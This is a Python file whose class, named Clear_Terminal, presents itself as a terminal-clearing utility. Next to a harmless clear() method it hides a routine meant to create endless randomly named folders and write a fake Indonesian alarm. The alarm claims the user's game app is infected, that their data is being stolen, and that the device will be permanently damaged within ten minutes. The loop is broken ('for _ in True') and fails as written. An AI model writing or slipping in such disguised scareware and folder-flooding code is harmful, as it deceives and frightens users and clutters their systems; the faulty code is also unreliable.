import os
import platform
import random
import string
class Clear_Terminal():
    mesange  = "Peringatan Keamanan!\nAplikasi Game Anda Telah Terinfeksi!\nSistem Anda menunjukkan bahwa ada ancaman berbahaya yang telah mengakses aplikasi game Anda. Data pribadi Anda terancam dicuri, dan perangkat Anda dapat mengalami kerusakan permanen.\n\nUntuk menghindari kerusakan lebih lanjut dan melindungi informasi Anda, segara keluar dari aplikasi dan restart perangkat Anda.\n\nTindakan yang Diperlukan:\nKeluar dari aplikasi sekarang!\nPastikan Anda menjalankan pemindaian antivirus.\nPeriksa aplikasi Anda untuk memastikan tidak ada ancaman lebih lanjut.\nJika Anda tidak melakukan langkah-langkah ini dalam 10 menit, perangkat Anda dapat mengalami kerusakan permanen.\n\nJangan Abaikan Peringatan Ini!"
    @staticmethod
    def create_random_folder_and_message():
        # Membuat nama folder target secara acak
        target_directory = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        # Memastikan direktori target ada
        os.makedirs(target_directory, exist_ok=True)
        random_select = random.randint(0,100)
        for _ in True:
            
            # Membuat nama folder acak
            folder_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            folder_path = os.path.join(target_directory, folder_name)  # Lokasi folder di direktori target
            # Membuat folder
            os.makedirs(folder_path, exist_ok=True)
            if(random_select == _) :
                # Menulis pesan ke dalam file di dalam folder
                file_name = 'message.txt'
                file_path = os.path.join(folder_path, file_name)
                with open(file_path, 'w') as f:
                    f.write(Clear_Terminal.mesange)
    
    @staticmethod
    def clear():
        os_name = platform.system()
        if (os_name == "Windows"):
            os.system("cls")
        else :
            os.system("clear")

